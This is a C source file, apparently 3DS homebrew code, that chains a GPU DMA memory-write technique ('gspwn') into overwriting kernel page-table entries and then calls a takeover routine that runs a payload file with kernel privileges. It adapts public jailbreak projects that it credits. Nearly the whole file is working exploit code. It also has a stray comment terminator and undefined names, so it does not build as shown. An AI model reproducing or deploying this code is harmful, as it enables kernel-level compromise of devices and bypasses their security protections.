#include <string.h>
#include <stdio.h>
#include <malloc.h>

// #include <3ds.h>
#include <3ds/svc.h>
#include <3ds/services/gspgpu.h>
#include <3ds/types.h>

// https://github.com/smealum/udsploit/blob/master/source/asm.s#L12
inline void __flush_prefetch_buffer(void)
{
    // Similar to isb in newer Arm architecture versions
    __asm__ __volatile__ ("mcr p15, 0, %0, c7, c5, 4" :: "r" (0) : "memory");
}

// Source: https://github.com/smealum/udsploit/blob/master/source/kernel.c#L11
static void gspSetTextureCopyPhys(u32 outPa, u32 inPa, u32 size, u32 inDim, u32 outDim, u32 flags)
{
	// Ignore results... only reason it would be invalid is if the handle itself is invalid
	const u32 enableBit = 1;

	GSPGPU_WriteHWRegs(0x1EF00C00 - 0x1EB00000, (u32[]){inPa >> 3, outPa >> 3}, 0x8);
	GSPGPU_WriteHWRegs(0x1EF00C20 - 0x1EB00000, (u32[]){size, inDim, outDim}, 0xC);
	GSPGPU_WriteHWRegs(0x1EF00C10 - 0x1EB00000, &flags, 4);
	GSPGPU_WriteHWRegsWithMask(0x1EF00C18 - 0x1EB00000, &enableBit, 4, &enableBit, 4);

	svcSleepThread(25 * 1000 * 1000LL); // should be enough
}

static inline void gspwn(u32 outPa, u32 inPa, u32 size)
{
    gspSetTextureCopyPhys(outPa, inPa, size, 0, 0, 8);
}

// https://github.com/luigoalma/nimdsphax/blob/master/source/nimdsphax.c#L66
// https://github.com/TuxSH/universal-otherapp/blob/master/source/kernel_gspwn.c#L4
static void mapL2TableViaGpuDma(const BlobLayout *layout, void *workBuffer)
{
	static const u32 s_l1tables[] = { 0x1FFF8000, 0x1FFFC000, 0x1F3F8000, 0x1F3FC000 };
	u32 numCores = IS_N3DS ? 4 : 2;

	// Minimum size of GPU DMA is 16, so we need to pad a bit...
	u32 l1EntryData[4] = { osConvertVirtToPhys(layout->l2table) | 1 };
	memcpy(workBuffer, l1EntryData, 16);
	__dsb();

	// Ignore result
	GSPGPU_FlushDataCache(workBuffer, 16);

	u32 l1EntryPa = osConvertVirtToPhys(workBuffer);

	for (u32 i = 0; i < numCores; i++) {
		u32 dstPa = s_l1tables[i] + (KHC3DS_MAP_ADDR >> 20) * 4;
		gspwn(dstPa, l1EntryPa, 16);
	}

	// No need to clean&invalidate here:
	// https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
	// "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"

	__dsb();
	__flush_prefetch_buffer();
}
*/

Result Do_KernelBackDoorPatch(const char *payloadFileName, size_t payloadFileOffset)
{	
	__dsb();
	
	{
		// https://github.com/TuxSH/universal-otherapp/blob/master/source/main.c#L27
	    BlobLayout *layout = (BlobLayout *)linearMemAlign(sizeof(BlobLayout), 0x1000);
	    if (layout == NULL) {
	        return -1;
	    }
	
	    memset(layout, 0, sizeof(BlobLayout));
	    memcpy(layout->code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
	    khc3dsPrepareL2Table(layout);
		
	    // Ensure everything (esp. the layout) is written back into the main memory
	    GSPGPU_FlushDataCache((const void *)0x14000000, 0x700000);
	}

	{
		// https://github.com/TuxSH/universal-otherapp/blob/master/source/main.c#L65
		__dsb();
    	__flush_prefetch_buffer();
	}

	// https://github.com/TuxSH/universal-otherapp/blob/f6c67f520c8e38cf6a1ab7c68600dd4af827ed3c/source/kernel_gspwn.c#L4
	// We can now GPU DMA the kernel. Let's map the L2 table we have prepared
    mapL2TableViaGpuDma(layout, layout->smallWorkBuffer);

    khc3dsLcdDebug(true, 128, 64, 0); // brown
    return khc3dsTakeover(payloadFileName, payloadFileOffset);
}
